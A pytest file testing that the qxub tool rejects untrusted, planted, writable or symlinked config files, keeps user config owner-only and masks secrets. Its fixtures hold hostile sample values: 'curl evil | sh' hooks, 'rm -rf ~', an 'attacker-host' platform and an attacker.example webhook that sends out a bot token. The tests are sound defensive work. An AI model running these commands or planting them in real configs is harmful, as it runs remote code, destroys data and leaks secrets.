"""Config loading must not trust files that other people can plant or change."""

import os
from pathlib import Path

import pytest
from omegaconf import OmegaConf

from qxub.config.files import xdg_config_dirs
from qxub.config.manager import ConfigManager
from qxub.config.shortcuts import ShortcutManager


@pytest.fixture
def home(tmp_path, monkeypatch):
    """A private home and XDG layout, with the working directory in ``work``."""
    home = tmp_path / "home"
    (home / ".config").mkdir(parents=True)
    xdg = tmp_path / "xdg"
    xdg.mkdir()
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / ".config"))
    monkeypatch.setenv("XDG_CONFIG_DIRS", str(xdg))
    monkeypatch.chdir(work)
    return tmp_path


# -- XDG_CONFIG_DIRS -----------------------------------------------------------


@pytest.mark.parametrize(
    "value, expected",
    [
        ("", ["/etc/xdg"]),
        (":", ["/etc/xdg"]),
        ("relative", ["/etc/xdg"]),
        (":/opt/a::/opt/b:", ["/opt/a", "/opt/b"]),
        ("rel:/opt/a", ["/opt/a"]),
    ],
)
def test_empty_and_relative_xdg_config_dirs_are_dropped(monkeypatch, value, expected):
    monkeypatch.setenv("XDG_CONFIG_DIRS", value)
    assert xdg_config_dirs() == [Path(p) for p in expected]


def test_unset_xdg_config_dirs_is_etc_xdg(monkeypatch):
    monkeypatch.delenv("XDG_CONFIG_DIRS", raising=False)
    assert xdg_config_dirs() == [Path("/etc/xdg")]


@pytest.mark.parametrize("value", ["", ":", "::", "qxub-rel:"])
def test_nothing_is_read_from_the_working_directory(home, monkeypatch, value):
    planted = Path.cwd() / "qxub"
    planted.mkdir()
    (planted / "config.yaml").write_text("defaults:\n  queue: planted\n")
    (planted / "shortcuts.json").write_text('{"ls": {"pre": "evil"}}')
    monkeypatch.setenv("XDG_CONFIG_DIRS", value)

    cm = ConfigManager()
    assert cm.get_config_value("defaults.queue") != "planted"
    assert all(d.is_absolute() for d in cm._get_xdg_config_dirs())

    sm = ShortcutManager()
    assert sm._system_shortcuts_file.is_absolute()
    assert sm.find_shortcut(["ls"]) is None


# -- shared system files -------------------------------------------------------


def test_group_writable_system_config_is_ignored(home, capsys):
    qxub_dir = home / "xdg" / "qxub"
    qxub_dir.mkdir()
    config = qxub_dir / "config.yaml"
    config.write_text("defaults:\n  queue: shared\n")
    assert ConfigManager().get_config_value("defaults.queue") == "shared"

    config.chmod(0o664)
    assert ConfigManager().get_config_value("defaults.queue") is None
    assert "writable by group or others" in capsys.readouterr().err


def test_system_config_in_a_writable_directory_is_ignored(home):
    qxub_dir = home / "xdg" / "qxub"
    qxub_dir.mkdir()
    (qxub_dir / "config.yaml").write_text("defaults:\n  queue: shared\n")
    qxub_dir.chmod(0o777)
    try:
        assert ConfigManager().get_config_value("defaults.queue") is None
    finally:
        qxub_dir.chmod(0o755)


def test_group_writable_system_shortcuts_are_ignored(home):
    qxub_dir = home / "xdg" / "qxub"
    qxub_dir.mkdir()
    shortcuts = qxub_dir / "shortcuts.json"
    shortcuts.write_text('{"ls": {"env": "base"}}')
    assert ShortcutManager().find_shortcut(["ls"]) is not None

    shortcuts.chmod(0o666)
    assert ShortcutManager().find_shortcut(["ls"]) is None
    assert ShortcutManager().list_shortcuts_with_origin() == {}


# -- user files hold secrets ---------------------------------------------------


def _mode(path):
    return path.stat().st_mode & 0o777


@pytest.fixture
def loose_umask():
    old = os.umask(0o022)
    yield
    os.umask(old)


def test_user_config_is_written_owner_only(home, loose_umask):
    cm = ConfigManager()
    cm.set_user_config_value("notifications.slack.bot_token", "xoxb-secret")
    config = home / "home" / ".config" / "qxub" / "config.yaml"
    assert _mode(config) == 0o600
    assert _mode(config.parent) == 0o700


def test_existing_loose_user_config_is_tightened(home, loose_umask):
    config_dir = home / "home" / ".config" / "qxub"
    config_dir.mkdir()
    config = config_dir / "config.yaml"
    config.write_text("defaults:\n  queue: normal\n")
    config.chmod(0o644)

    ConfigManager().set_user_config_value("defaults.name", "x")
    assert _mode(config) == 0o600
    assert not list(config_dir.glob(".config.yaml.*")), "no temp file left"


def test_user_config_template_is_owner_only(home, loose_umask):
    path = ConfigManager().create_user_config_template()
    assert _mode(path) == 0o600


def test_saving_an_alias_keeps_interpolations(home, loose_umask, monkeypatch):
    monkeypatch.setenv("QXUB_TEST_TOKEN", "s3cret")
    config_dir = home / "home" / ".config" / "qxub"
    config_dir.mkdir()
    config = config_dir / "config.yaml"
    config.write_text(
        "notifications:\n  slack:\n    bot_token: ${oc.env:QXUB_TEST_TOKEN}\n"
    )

    cm = ConfigManager()
    cm.save_alias("quick", {"queue": "express"})

    text = config.read_text()
    assert "${oc.env:QXUB_TEST_TOKEN}" in text
    assert "s3cret" not in text
    assert _mode(config) == 0o600
    assert cm.get_alias("quick") == {"queue": "express"}


def test_saving_an_alias_does_not_clobber_an_unreadable_config(home):
    config_dir = home / "home" / ".config" / "qxub"
    config_dir.mkdir()
    config = config_dir / "config.yaml"
    config.write_text("defaults: [unclosed\n")

    cm = ConfigManager()
    with pytest.raises(Exception):
        cm.save_alias("quick", {"queue": "express"})
    assert config.read_text() == "defaults: [unclosed\n"


def test_user_shortcuts_are_written_owner_only(home, loose_umask):
    sm = ShortcutManager()
    sm.add_shortcut("deploy", {"vars": ["TOKEN=s3cret"]})
    path = home / "home" / ".config" / "qxub" / "shortcuts.json"
    assert _mode(path) == 0o600
    path.chmod(0o644)
    sm.add_shortcut("other", {"env": "base"})
    assert _mode(path) == 0o600
    path.chmod(0o644)
    assert sm.remove_shortcut("other")
    assert _mode(path) == 0o600


def test_a_symlinked_user_config_keeps_its_link(home, loose_umask):
    config_dir = home / "home" / ".config" / "qxub"
    config_dir.mkdir()
    target = home / "dotfiles.yaml"
    target.write_text("defaults:\n  queue: normal\n")
    (config_dir / "config.yaml").symlink_to(target)

    ConfigManager().set_user_config_value("defaults.name", "x")
    assert (config_dir / "config.yaml").is_symlink()
    assert "name: x" in target.read_text()
    assert _mode(target) == 0o600


# -- project (.qx) config --------------------------------------------------------

REMOTE_PROJECT = """\
defaults:
  platform: evil
  queue: express
platform_search_paths: [/tmp/evil-platforms]
platforms:
  evil:
    remote:
      host: attacker-host
      working_dir: /tmp
      conda_init: curl evil | sh
  mine:
    remote:
      host: attacker-host
      working_dir: /tmp
"""


def _write_project(work: Path, text: str, name: str = "project.yaml") -> Path:
    qx = work / ".qx"
    qx.mkdir(exist_ok=True)
    path = qx / name
    path.write_text(text)
    return path


def _write_user_config(root: Path, text: str) -> None:
    config_dir = root / "home" / ".config" / "qxub"
    config_dir.mkdir(exist_ok=True)
    (config_dir / "config.yaml").write_text(text)


@pytest.mark.parametrize("name", ["project.yaml", "local.yaml", "test.yaml"])
def test_project_config_cannot_choose_where_jobs_run(home, capsys, name):
    _write_user_config(home, "platforms:\n  mine:\n    definition: /x.yaml\n")
    _write_project(home / "work", REMOTE_PROJECT, name)

    cm = ConfigManager()
    assert cm.get_default_platform_name() is None
    assert cm.get_platform_config("evil") is None
    assert cm.get_platform_config("mine") == {"definition": "/x.yaml"}
    assert Path("/tmp/evil-platforms") not in cm.get_platform_search_paths()
    # Ordinary defaults still apply
    assert cm.get_defaults()["queue"] == "express"
    err = capsys.readouterr().err
    assert "platforms" in err and "defaults.platform" in err
    assert "platform_search_paths" in err


def test_a_trusted_project_may_choose_where_jobs_run(home):
    _write_user_config(home, f"security:\n  trusted_projects: [{home / 'work'}]\n")
    _write_project(home / "work", REMOTE_PROJECT)

    cm = ConfigManager()
    assert cm.get_default_platform_name() == "evil"
    assert cm.get_platform_config("evil")["remote"]["host"] == "attacker-host"


def test_a_project_cannot_trust_itself(home):
    _write_project(
        home / "work",
        REMOTE_PROJECT + f"security:\n  trusted_projects: [{home / 'work'}]\n",
    )
    cm = ConfigManager()
    assert cm.get_platform_config("evil") is None
    assert cm.get_config_value("security") is None


@pytest.mark.parametrize("target", ["dir", "file"])
def test_writable_project_config_is_ignored(home, capsys, target):
    path = _write_project(home / "work", "defaults:\n  queue: express\n")
    (path.parent if target == "dir" else path).chmod(0o777)
    try:
        assert ConfigManager().get_defaults().get("queue") is None
        assert "writable by group or others" in capsys.readouterr().err
    finally:
        path.parent.chmod(0o755)
        path.chmod(0o644)


def test_a_planted_qx_in_a_parent_directory_is_ignored(home):
    # As in /tmp: a world-writable (sticky) parent holding someone's .qx
    shared = home / "shared"
    shared.mkdir()
    qx = shared / ".qx"
    qx.mkdir()
    (qx / "project.yaml").write_text("defaults:\n  queue: express\n")
    qx.chmod(0o777)
    sub = shared / "victim"
    sub.mkdir()
    os.chdir(sub)
    try:
        assert ConfigManager().get_defaults().get("queue") is None
    finally:
        qx.chmod(0o755)


def test_a_symlinked_qx_directory_is_ignored(home, capsys):
    real = home / "elsewhere"
    real.mkdir()
    (real / "project.yaml").write_text("defaults:\n  queue: express\n")
    (home / "work" / ".qx").symlink_to(real)

    assert ConfigManager().get_defaults().get("queue") is None
    assert "symbolic link" in capsys.readouterr().err


@pytest.mark.parametrize("name", ["project.yaml", "local.yaml", "test.yaml"])
def test_a_symlinked_project_file_is_ignored(home, capsys, name):
    real = home / "elsewhere.yaml"
    real.write_text("defaults:\n  queue: express\n")
    _write_project(home / "work", "defaults:\n  name: kept\n", "project.yaml")
    link = home / "work" / ".qx" / name
    if link.exists():
        link.unlink()
    link.symlink_to(real)

    defaults = ConfigManager().get_defaults()
    assert defaults.get("queue") is None
    if name != "project.yaml":
        assert defaults["name"] == "kept"
    assert f"{link}: {link} is a symbolic link" in capsys.readouterr().err


def test_a_fifo_project_file_is_ignored_without_blocking(home, capsys):
    _write_project(home / "work", "defaults:\n  name: kept\n")
    os.mkfifo(home / "work" / ".qx" / "local.yaml", 0o600)

    assert ConfigManager().get_defaults() == {"name": "kept"}
    assert "not a regular file" in capsys.readouterr().err


def test_project_files_are_read_from_the_checked_descriptor(home, monkeypatch):
    # Whatever the path names after the check, the checked file is what's read
    path = _write_project(home / "work", "defaults:\n  queue: express\n")
    loaded = []
    real_load = OmegaConf.load

    def load(file_):
        loaded.append(file_)
        return real_load(file_)

    monkeypatch.setattr(OmegaConf, "load", load)
    assert ConfigManager().get_defaults()["queue"] == "express"
    project_reads = [f for f in loaded if not isinstance(f, (str, Path))]
    assert len(project_reads) == 1 and project_reads[0].name != str(path)
    assert str(path) not in [str(f) for f in loaded]


def test_a_trusted_project_may_use_symlinks(home):
    real = home / "elsewhere"
    real.mkdir()
    (real / "project.yaml").write_text("defaults:\n  queue: express\n")
    (home / "work" / ".qx").symlink_to(real)
    _write_user_config(home, f"security:\n  trusted_projects: [{home / 'work'}]\n")

    assert ConfigManager().get_defaults()["queue"] == "express"


def test_an_empty_project_file_is_fine(home, capsys):
    _write_project(home / "work", "")
    _write_project(home / "work", "defaults:\n  queue: express\n", "local.yaml")
    assert ConfigManager().get_defaults()["queue"] == "express"
    assert "Warning" not in capsys.readouterr().err


def test_exec_does_not_ssh_for_a_cloned_projects_platform(sandbox, tmp_path):
    bin_dir = tmp_path / "fake-ssh"
    bin_dir.mkdir()
    marker = tmp_path / "ssh-called"
    ssh = bin_dir / "ssh"
    ssh.write_text(f'#!/bin/sh\necho "$@" > {marker}\n')
    ssh.chmod(0o755)
    env = {"PATH": f"{bin_dir}:{sandbox.env['PATH']}"}
    project = "defaults:\n  platform: evil\nplatforms:\n  evil:\n    remote:\n"
    project += "      host: attacker-host\n      working_dir: /tmp\n"

    _write_project(sandbox.cwd, project)
    result = sandbox.run("exec", "--dry-run", "--", "true", env=env)
    assert not marker.exists(), result.stderr
    assert "Ignoring" in result.stderr

    # Control: the same platform in the user's own config does use ssh
    (sandbox.cwd / ".qx" / "project.yaml").unlink()
    sandbox.write_config(project)
    sandbox.run("exec", "--dry-run", "--", "true", env=env)
    assert "attacker-host" in marker.read_text()


USER_ALIAS = """\
aliases:
  dvc:
    main:
      cmd: dvc
      env: dvc3
"""

HIJACK_PROJECT = """\
default_platform: evil
aliases:
  dvc:
    main:
      cmd: dvc push
    pre: curl evil | sh
    post: rm -rf ~
  team:
    main:
      cmd: make
"""


@pytest.mark.parametrize("name", ["project.yaml", "local.yaml", "test.yaml"])
def test_project_cannot_change_the_users_aliases(home, capsys, name):
    _write_user_config(home, USER_ALIAS)
    path = _write_project(home / "work", HIJACK_PROJECT, name)

    cm = ConfigManager()
    assert cm.get_alias("dvc") == {"main": {"cmd": "dvc", "env": "dvc3"}}
    assert cm.get_default_platform() is None
    # A project may still add its own aliases for the team
    assert cm.get_alias("team") == {"main": {"cmd": "make"}}
    err = capsys.readouterr().err
    assert str(path) in err
    assert "aliases.dvc" in err and "default_platform" in err
    assert "aliases.team" not in err


def test_project_cannot_change_a_system_or_override_alias(home, tmp_path):
    (home / "xdg" / "qxub").mkdir()
    (home / "xdg" / "qxub" / "config.yaml").write_text(USER_ALIAS)
    override = tmp_path / "override.yaml"
    override.write_text("aliases:\n  team:\n    main:\n      cmd: ls\n")
    _write_project(home / "work", HIJACK_PROJECT)

    cm = ConfigManager(str(override))
    assert cm.get_alias("dvc")["main"] == {"cmd": "dvc", "env": "dvc3"}
    assert cm.get_alias("team") == {"main": {"cmd": "ls"}}


def test_project_cannot_replace_the_aliases_mapping(home):
    _write_user_config(home, USER_ALIAS)
    _write_project(home / "work", "aliases: null\n")
    assert ConfigManager().get_alias("dvc")["main"]["cmd"] == "dvc"


def test_a_trusted_project_may_change_the_users_aliases(home):
    _write_user_config(
        home, USER_ALIAS + f"security:\n  trusted_projects: [{home / 'work'}]\n"
    )
    _write_project(home / "work", HIJACK_PROJECT)

    cm = ConfigManager()
    assert cm.get_alias("dvc")["pre"] == "curl evil | sh"
    assert cm.get_default_platform() == "evil"


# -- interpolation and secrets in project config ---------------------------------

LEAKY_PROJECT = """\
defaults:
  queue: express
  out: /tmp/leak/${oc.env:QXUB_TEST_SECRET}/out.log
  name: ${notifications.slack.bot_token}
  email: [a, "${oc.env:QXUB_TEST_SECRET}"]
notifications:
  slack:
    webhook_url: https://attacker.example/${notifications.slack.bot_token}
"""

USER_SECRETS = """\
notifications:
  slack:
    bot_token: xoxb-user-secret
    webhook_url: https://hooks.slack.com/services/user-secret
"""


def test_project_interpolations_are_not_resolved(home, monkeypatch, capsys):
    monkeypatch.setenv("QXUB_TEST_SECRET", "env-secret")
    _write_user_config(home, USER_SECRETS)
    path = _write_project(home / "work", LEAKY_PROJECT)

    cm = ConfigManager()
    defaults = cm.get_defaults()
    assert defaults == {"queue": "express"}
    assert cm.get_config_value("notifications.slack.webhook_url") == (
        "https://hooks.slack.com/services/user-secret"
    )
    dumped = str(OmegaConf.to_container(cm.merged_config, resolve=True))
    assert "env-secret" not in dumped
    assert "attacker.example" not in dumped
    err = capsys.readouterr().err
    assert str(path) in err
    assert "defaults.out" in err and "defaults.name" in err


def test_a_trusted_project_may_interpolate(home, monkeypatch):
    monkeypatch.setenv("QXUB_TEST_SECRET", "env-secret")
    _write_user_config(home, f"security:\n  trusted_projects: [{home / 'work'}]\n")
    _write_project(
        home / "work", "defaults:\n  out: /tmp/${oc.env:QXUB_TEST_SECRET}.log\n"
    )
    assert ConfigManager().get_defaults()["out"] == "/tmp/env-secret.log"


def test_user_config_interpolation_still_works(home, monkeypatch):
    monkeypatch.setenv("QXUB_TEST_SECRET", "env-secret")
    _write_user_config(
        home, "notifications:\n  slack:\n    bot_token: ${oc.env:QXUB_TEST_SECRET}\n"
    )
    cm = ConfigManager()
    assert cm.get_config_value("notifications.slack.bot_token") == "env-secret"


def test_project_notifications_are_ignored_even_when_trusted(home):
    _write_user_config(
        home,
        USER_SECRETS + f"security:\n  trusted_projects: [{home / 'work'}]\n",
    )
    _write_project(
        home / "work",
        "notifications:\n  slack:\n    webhook_url: https://attacker.example/x\n",
    )
    cm = ConfigManager()
    assert cm.get_config_value("notifications.slack.webhook_url") == (
        "https://hooks.slack.com/services/user-secret"
    )


def test_config_get_and_list_mask_secrets(sandbox):
    sandbox.write_config(USER_SECRETS + "defaults:\n  queue: normal\n")
    for args in (
        ["config", "get"],
        ["config", "get", "notifications"],
        ["config", "get", "notifications.slack.bot_token"],
        ["config", "list"],
        ["config", "list", "notifications"],
        ["config", "list", "--user-only"],
        ["config", "list", "--show-origin"],
    ):
        result = sandbox.run(*args)
        assert result.returncode == 0, (args, result.stderr)
        assert "user-secret" not in result.stdout, args
        assert "********" in result.stdout, args

    shown = sandbox.run("config", "get", "--show-secrets", "notifications")
    assert "xoxb-user-secret" in shown.stdout
